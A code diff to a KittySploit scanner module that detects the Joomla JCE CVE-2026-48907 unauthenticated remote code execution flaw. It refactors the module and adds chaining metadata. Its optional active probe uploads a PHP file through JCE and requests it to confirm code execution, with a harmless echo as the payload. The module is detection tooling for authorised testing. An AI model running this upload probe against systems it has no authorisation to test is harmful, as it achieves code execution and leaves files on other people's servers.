@@ -7,13 +7,10 @@ import re
 
 from kittysploit import *
 from lib.protocols.http.http_client import Http_client
-from lib.protocols.http.joomla_probe import JCE_PATCHED_VERSION, JoomlaProbe
-
-_PROBE_MARKER = "KS-JCE-48907"
-_RXST_RE = re.compile(r"RXST:([A-Za-z0-9+/=]+):RXEND")
+from lib.protocols.http.joomla_probe import JCE_PATCHED_VERSION, Joomla
 
 
-class Module(Scanner, Http_client):
+class Module(Scanner, Http_client, Joomla):
 
     __info__ = {
         "name": "Joomla JCE CVE-2026-48907 (unauthenticated RCE) detection",
@@ -40,15 +37,40 @@ class Module(Scanner, Http_client):
             "reversible": False,
             "approval_required": True,
             "produces": ["tech_hints", "risk_signals", "endpoints"],
+            "cost": 1.0,
+            "noise": 0.5,
+            "value": 1.0,
             "requires": {
+                "min_endpoints": 0,
+                "min_params": 0,
                 "tech_hints_any": ["joomla", "php"],
+                "tech_hints_all": [],
+                "specializations_any": [],
+                "risk_signals_any": [],
+                "auth_session": False,
+                "capabilities_any": [],
+                "capabilities_all": [],
+                "confidence_min": {},
                 "confidence_min_any": {"joomla": 0.3, "php": 0.3},
+                "endpoint_pattern_any": [],
+                "param_any": [],
+                "api_surface_ready": False,
             },
-            "incompatible_when": {
-                "tech_hints_any": ["wordpress", "drupal", "nextjs", "react", "nodejs"],
+            "chain": {
+                "produces_capabilities": [
+                    {"capability": "ssrf_primitive", "from_detail": ""},
+                    {"capability": "file_read", "from_detail": "lfi_path"},
+                    {"capability": "lfi_param", "from_detail": "lfi_param"},
+                ],
+                "consumes_capabilities": [],
+                "option_bindings": {},
+                "suggested_followups": [],
             },
         },
     }
+
+    _PROBE_MARKER = "KS-JCE-48907"
+    _RXST_RE = re.compile(r"RXST:([A-Za-z0-9+/=]+):RXEND")
 
     active_probe = OptBool(
         False,
@@ -58,14 +80,14 @@ class Module(Scanner, Http_client):
 
     def _make_verify_payload(self, expected: int) -> str:
         return (
-            f"{_PROBE_MARKER} probe. Authorized security assessment. Please delete this file!\n"
+            f"{self._PROBE_MARKER} probe. Authorized security assessment. Please delete this file!\n"
             "<?php "
             f"echo 'RXST:'.base64_encode('MATHOK:{expected}').':RXEND';"
             " ?>"
         )
 
     def _check_execution(self, body: str, expected: int) -> bool:
-        match = _RXST_RE.search(body or "")
+        match = self._RXST_RE.search(body or "")
         if not match:
             return False
         try:
@@ -74,20 +96,20 @@ class Module(Scanner, Http_client):
             return False
         return f"MATHOK:{expected}" in decoded
 
-    def _run_active_probe(self, probe: JoomlaProbe, token: str) -> dict:
+    def _run_active_probe(self, token: str) -> dict:
         factor_a = random.randint(100, 999)
         factor_b = random.randint(100, 999)
         expected = factor_a * factor_b
         payload = self._make_verify_payload(expected)
 
-        uploaded = probe.jce_upload_php(token, payload)
+        uploaded = self.jce_upload_php(token, payload)
         if not uploaded:
             return {
                 "status": "SAFE",
                 "detail": "Active exploit vectors failed — target may be patched or hardened.",
             }
 
-        verify = probe.http_get(uploaded["path"], timeout=8)
+        verify = self.joomla_http_get(uploaded["path"], timeout=8)
         if not verify or verify.status_code != 200:
             return {
                 "status": "VULNERABLE_UPLOAD_ONLY",
@@ -133,25 +155,23 @@ class Module(Scanner, Http_client):
 
     def run(self):
         try:
-            probe = JoomlaProbe(self)
-
-            joomla = probe.probe_joomla()
+            joomla = self.probe_joomla()
             if not joomla.get("found"):
                 return False
 
-            jce = probe.probe_jce()
+            jce = self.probe_jce()
             if not jce.get("found"):
                 return False
 
             joomla_version = joomla.get("version")
             jce_version = jce.get("version")
 
-            if jce_version and probe.jce_is_patched(jce_version):
+            if jce_version and self.jce_is_patched(jce_version):
                 print_status(f"JCE {jce_version} >= {JCE_PATCHED_VERSION} (patched)")
                 return False
 
             if not self.active_probe:
-                if jce_version and not probe.jce_is_patched(jce_version):
+                if jce_version and not self.jce_is_patched(jce_version):
                     self.set_info(
                         severity="critical",
                         cve="CVE-2026-48907",
@@ -164,21 +184,9 @@ class Module(Scanner, Http_client):
                         confidence="high",
                     )
                     return True
+                return False
 
-                self.set_info(
-                    severity="medium",
-                    cve="CVE-2026-48907",
-                    reason=(
-                        "Joomla with JCE detected but JCE version unknown. "
-                        f"Potentially vulnerable if < {JCE_PATCHED_VERSION}. "
-                        "Enable active_probe to confirm."
-                    ),
-                    joomla_version=joomla_version or "unknown",
-                    confidence="medium",
-                )
-                return True
-
-            token = probe.fetch_csrf_token()
+            token = self.fetch_csrf_token()
             if not token:
                 self.set_info(
                     severity="medium",
@@ -193,7 +201,7 @@ class Module(Scanner, Http_client):
                 )
                 return True
 
-            result = self._run_active_probe(probe, token)
+            result = self._run_active_probe(token)
             status = result.get("status", "SAFE")
             proof_path = result.get("proof_path")
 
@@ -227,7 +235,7 @@ class Module(Scanner, Http_client):
                 print_warning(result.get("detail", "Upload confirmed — delete uploaded probe file"))
                 return True
 
-            if jce_version and not probe.jce_is_patched(jce_version):
+            if jce_version and not self.jce_is_patched(jce_version):
                 self.set_info(
                     severity="high",
                     cve="CVE-2026-48907",
